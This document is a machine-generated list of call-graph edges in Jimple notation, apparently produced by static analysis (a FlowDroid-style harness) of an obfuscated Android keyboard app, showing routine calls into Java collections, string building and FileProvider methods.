STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ivw: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(17) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] x()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(0) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljd: java.util.Map o()>() in <ljb: java.lang.Object getValue()> ==> <ljd: java.util.Map o()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <ljd: java.util.Iterator l()> ==> <java.util.LinkedHashMap: java.util.Set entrySet()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Flag [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingSearchTermMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(11) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_Initialized", $r3) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Error: void <init>()> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljd: void A(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.List: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void q(int)>(3) in <ljd: void <init>()> ==> <ljd: void q(int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(16) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lkm: java.lang.Object a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>($l2, $l3) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r2, $r5) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
VIRTUAL edge: $r7 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r5, "", $r6, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean isEmpty()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lvs: lvs a(java.lang.Object)>($r1) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r5.<lqd: lqd c()>() in <lmb: lme f()> ==> <lqd: lqd c()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: $r3 = interfaceinvoke $r5.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean x(char)>
VIRTUAL edge: $r7 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
INTERFACE edge: $z0 = interfaceinvoke $r8.<java.util.Iterator: boolean hasNext()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.a: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/c;", "value") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int size()>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljf: void i(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqp: void <init>(java.lang.Object[],int,int)> ==> <lkq: void <init>()>
STATIC edge: $r1 = staticinvoke <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>($r3, $r4) in <lme: lma d(java.lang.Object)> ==> <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsc: void <init>(lto)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <lri: int b(java.util.Set)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: int size()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gbk: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lrg: void <init>(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: int hashCode()>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 1) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <mij: void <init>(miy)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>($r2, $l0) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)> ==> <j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(7) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: staticinvoke <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>($r2, $r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>
SPECIAL edge: specialinvoke $r9.<lwk: void <init>()>() in <lwf: void <clinit>()> ==> <lwk: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r4.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <liy: void <init>(ljd)> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lql: int size()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorCategoryMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lma: int e(int)>
STATIC edge: $r3 = staticinvoke <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>($r2, $r6) in <llg: java.lang.Object next()> ==> <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int,int)>(0, $i0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int,int)>
STATIC edge: $z1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r3, $i2, $r6) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r9.<java.lang.StringBuilder: void <init>()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lkh: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <lri: boolean j(java.util.Set,java.lang.Object)>(r0, $r1) in <lma: boolean equals(java.lang.Object)> ==> <lri: boolean j(java.util.Set,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r5, 0, $r6, 6, $i1) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("at index ") in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <ljf: void <init>()> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljf: int b()> ==> <izw: java.lang.Object al(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: int ae(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $i0 = staticinvoke <izw: int ae(int)>($i0) in <izw: int ak(int)> ==> <izw: int ae(int)>
SPECIAL edge: specialinvoke $r0.<ldr: void <init>()>() in <ldr: void <clinit>()> ==> <ldr: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.lang.Object h(int)>($i0) in <ljb: void <init>(ljd,int)> ==> <ljd: java.lang.Object h(int)>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljd: int z(int,int,int,int)> ==> <izw: int af(int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: staticinvoke <lri: void v(java.lang.Object[],int)>($r0, $i0) in <lri: void u(java.lang.Object[])> ==> <lri: void v(java.lang.Object[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(2) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lql: int size()>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <liz: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.Throwable getCause()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lkq: int size()>() in <lqs: int size()> ==> <lql: int size()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: java.lang.Object[] n()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqp: int size()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("<") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r1 = specialinvoke r0.<lkt: lkx b(boolean)>(1) in <lkt: lkx l()> ==> <lkt: lkx b(boolean)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(axu,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r1.<lnc: void <init>(java.lang.Object)>($r0) in <izw: lsa w(java.lang.Object)> ==> <lnc: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i4, $r0, $i0, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r2) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(int[],int[])>($r8, $r9) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(int[],int[])>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lql: int size()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <lri: int b(java.util.Set)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r6 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqs: lsa l()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: int hashCode()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Map: int size()>() in <ljd: int size()> ==> <java.util.HashMap: int size()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.String X(int,int,java.lang.String)>($i1, $i0, "index") in <iye: void Q(int,int)> ==> <iye: java.lang.String X(int,int,java.lang.String)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.util.Map o()>
SPECIAL edge: specialinvoke $r1.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>("cannot read from empty metadata") in <ltr: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
